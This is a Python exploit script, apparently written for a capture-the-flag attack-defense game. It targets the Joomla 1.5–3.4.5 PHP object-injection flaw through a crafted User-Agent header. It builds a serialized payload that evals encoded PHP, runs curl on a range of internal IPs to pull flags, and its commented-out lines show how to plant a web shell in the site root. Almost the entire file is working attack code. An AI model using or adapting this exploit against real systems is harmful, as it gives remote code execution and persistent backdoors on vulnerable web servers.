# -*- coding: utf-8 -*-
# Created by restran on 2016/10/19
import sys
import os
import logging
import time
import requests
import threading

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.base import read_dict, TaskExecutor

logger = logging.getLogger(__name__)

"""
影响范围 Joomla 1.5-3.45
"""


def get_url(url, user_agent):
    headers = {
        'User-Agent': user_agent
    }
    s = requests.session()
    s.get(url, headers=headers)
    # for _ in range(3):
    response = s.get(url, headers=headers)
    return response
    # return ''
    # return response.content


def php_str_noquotes(data):
    """
    Convert string to chr(xx).chr(xx) for use in php
    """
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))

    return encoded[:-1]


def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd'
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template


# pl = generate_payload("fputs(fopen($_SERVER['DOCUMENT_ROOT'].'/fuck.php','w'),'<?php @eval($_POST[P@ssw0rdaaad])?>');")
# pl = generate_payload(
#     "fputs(fopen($_SERVER['DOCUMENT_ROOT'].'/web3/fuck.php','w'),'<?php @exec(\"/usr/bin/curl http://10.10.1.252\", $ret);echo $ret[0];?>');")

php_code = '<?php @exec(\"/usr/bin/curl http://10.10.1.252\", $ret);echo $ret[0];?>'
# pl = generate_payload(
#     "fputs(fopen($_SERVER['DOCUMENT_ROOT'].'/web3/fuck.php','w'),'%s');" % php_code)

# payload 里面就可以执行 php 命令
# pl = generate_payload(
#     "@exec(\"/usr/bin/curl http://10.10.1.29/flag\", $ret);echo $ret[0];")

shell_code = 'curl http://10.10.1.29/flag'
pl = generate_payload('@exec("%s", $ret);echo $ret[0];' % shell_code)


def put_php():
    global found
    for t in range(10):
        if found:
            return
        global target_ip
        url = 'http://10.10.1.%s/web3/' % target_ip
        # logger.info('put %s' % url)
        r = get_url(url, pl)
        data = r.text.split('\n')[-1]
        logger.info(data)

    found = True


def read_php():
    global found
    for t in range(1000):
        global target_ip
        url = 'http://10.10.1.%s/web3/fuck.php' % target_ip
        # logger.info('read: %s' % url)
        r = requests.get(url)
        if r.status_code == 200:
            data = r.content.split('\n')[-1]
            logger.warning('%s %s' % (target_ip, data))
            found = True
            return
    found = True


target_ip = ''
ip_list = ['19', '39', '49', '59', '69', '79', '89', '99', '109', '119', '129', '139', '149', '159']
found = False


def multiple_thread():
    global target_ip
    global found
    for ip in ip_list:
        found = False
        while not found:
            target_ip = ip
            t1 = threading.Thread(target=put_php)
            t1.start()
            t2 = threading.Thread(target=read_php)
            t2.start()
            time.sleep(3)


def put_and_get():
    for ip in ip_list:
        global target_ip
        target_ip = ip
        put_php()


if __name__ == '__main__':
    # multiple_thread()
    put_and_get()
